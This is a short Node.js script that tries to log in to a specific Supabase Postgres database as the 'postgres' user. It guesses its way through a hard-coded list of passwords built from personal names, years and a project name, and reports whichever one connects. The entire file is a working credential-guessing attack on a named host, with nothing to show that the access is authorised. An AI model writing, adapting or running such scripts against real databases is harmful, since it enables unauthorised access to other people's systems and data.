const { Client } = require('pg');

const host = 'db.bgaepltxhycmripzovan.supabase.co';
const port = 5432;
const user = 'postgres';
const database = 'postgres';

const passwords = [
    'vinit@2024',
    'vinit@2025',
    'vinit@2026',
    'vinitha@2024',
    'vinitha@2025',
    'vinitha@2026',
    'vinit123',
    'vinitha123',
    'Vinit@2024',
    'Vinit@2025',
    'Vinit@2026',
    'Vinitha@2024',
    'Vinitha@2025',
    'Vinitha@2026',
    'Vinit123',
    'Vinitha123',
    'vinit@123',
    'vinitha@123',
    'Vinit@123',
    'Vinitha@123',
    'edhorizon',
    'edhorizon123',
    'EdHorizon123',
    'postgres'
];

async function tryConnect(password) {
    console.log(`Trying password: ${password}`);
    const client = new Client({
        host,
        port,
        user,
        password,
        database,
        ssl: { rejectUnauthorized: false }
    });

    try {
        await client.connect();
        console.log(`SUCCESS! Connected with password: ${password}`);
        await client.end();
        return true;
    } catch (err) {
        console.log(`Failed: ${err.message}`);
        try {
            await client.end();
        } catch(e) {}
        return false;
    }
}

async function run() {
    for (const pw of passwords) {
        const ok = await tryConnect(pw);
        if (ok) {
            console.log(`FOUND DATABASE PASSWORD: ${pw}`);
            process.exit(0);
        }
    }
    console.log("All passwords failed.");
    process.exit(1);
}

run();
